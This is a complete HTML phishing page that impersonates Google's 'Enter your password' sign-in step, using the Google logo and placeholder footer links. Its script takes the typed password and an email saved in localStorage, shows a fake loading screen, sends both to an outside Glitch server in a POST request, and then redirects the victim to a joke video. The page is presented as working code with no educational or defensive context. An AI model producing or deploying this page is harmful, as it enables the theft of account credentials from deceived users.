<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enter Your Password</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-50 flex flex-col min-h-screen">
    <div class="flex-grow flex items-center justify-center">
        <div class="w-full max-w-md mx-auto p-6 bg-white rounded-lg shadow-md">
            <div class="flex justify-center mb-6">
                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google logo" class="h-10">
            </div>
            <h1 class="text-2xl font-semibold text-gray-900 mb-2">Enter your password</h1>
            <form id="password-form">
                <div class="mb-4">
                    <label class="sr-only" for="password">Password</label>
                    <input class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" id="password" name="password" placeholder="Enter your password" type="password" required>
                </div>
                <div class="flex justify-between items-center">
                    <button class="bg-blue-600 text-white px-6 py-2 rounded-md" type="submit">Next</button>
                </div>
            </form>
        </div>
    </div>

    <footer class="w-full bg-gray-100 py-4">
        <div class="flex justify-between items-center text-gray-600 text-sm px-6">
            <div>
                <select class="bg-transparent">
                    <option>English (United States)</option>
                </select>
            </div>
            <div class="flex space-x-4">
                <a class="hover:underline" href="#">Help</a>
                <a class="hover:underline" href="#">Privacy</a>
                <a class="hover:underline" href="#">Terms</a>
            </div>
        </div>
    </footer>

    <script>
        document.getElementById('password-form').addEventListener('submit', function(event) {
            event.preventDefault();

            const password = document.getElementById('password').value.trim();
            const email = localStorage.getItem('email');

            // Check if password is at least 6 characters long
            if (password.length < 6) {
                alert('Password must be at least 6 characters long.');
                return;
            }

            // Show loading animation
            document.body.innerHTML = `
                <div class="flex-grow flex items-center justify-center">
                    <div class="text-xl font-semibold text-gray-900">
                        Loading...
                    </div>
                </div>
            `;

            // Simulate delay of 3-4 seconds
            setTimeout(() => {
                // Send data to the backend
                fetch('https://chipped-pine-tarascosaurus.glitch.me/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password }),
                })
                .then(response => response.json())
                .then(data => {
                    if (data.message) {
                        alert(data.message);
                        // Redirect to Rickroll after 3-4 seconds delay
                        window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'; // Redirect to Rickroll
                    } else {
                        alert(data.error || 'Something went wrong');
                    }
                })
                .catch(error => {
                    alert('Error: ' + error.message);
                });
            }, 3000); // 3-second delay before sending data
        });
    </script>
</body>
</html>
